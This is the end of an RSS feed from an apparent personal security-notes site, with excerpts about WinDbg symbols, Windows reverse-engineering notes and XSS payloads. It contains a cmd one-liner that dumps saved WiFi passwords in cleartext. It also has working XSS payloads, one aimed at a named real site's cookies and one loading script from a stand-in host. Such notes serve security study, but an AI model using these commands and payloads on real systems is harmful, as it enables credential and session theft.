.sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:
x notepad:! Note, if ytou don7t see any output, enter .</description>
    </item>
    
    <item>
      <title>Windows Notes</title>
      <link>http://duraki.github.io/notes/public/windows-notes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/windows-notes/</guid>
      <description>When setting up Reverse Engineering workstation, use retoolkit for a start kit.
 Extract WiFi cleartextr password
cls &amp;amp; echo. &amp;amp; for /f &amp;#34;tokens=4 delims=: &amp;#34; %a in (&amp;#39;netsh wlan show profiles ^| find &amp;#34;Profile &amp;#34;&amp;#39;) do @echo off &amp;gt; nul &amp;amp; (netsh wlan show profiles name=%a key=clear | findstr &amp;#34;SSID Cipher Content&amp;#34; | find /v &amp;#34;Number&amp;#34; &amp;amp; echo.) &amp;amp; @echo on Active Directory
Access Active Directory Domain Admin via Linux:</description>
    </item>
    
    <item>
      <title>XSS Payloads</title>
      <link>http://duraki.github.io/notes/public/xss-payloads/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/xss-payloads/</guid>
      <description>JSON: {&amp;#34;email&amp;#34;:&amp;#34;some@email.com&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)//&amp;#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?&amp;#39;&amp;#34;--&amp;gt;&amp;lt;script&amp;gt;confirm(document.cookie)&amp;lt;/script&amp;gt; In URL PATH: &amp;#34;accesskey=&amp;#39;x&amp;#39; onclick=&amp;#39;confirm`1`&amp;#39; // Hi&amp;#39;&amp;amp;gt;&amp;#34;&amp;lt;script src=&amp;#34;//xss-server&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;x=&amp;#34;{9*9}\r\n%0a%09%0d&amp;lt;svg\onload=confirm(1)&amp;gt; </description>
    </item>
    
  </channel>
</rss>
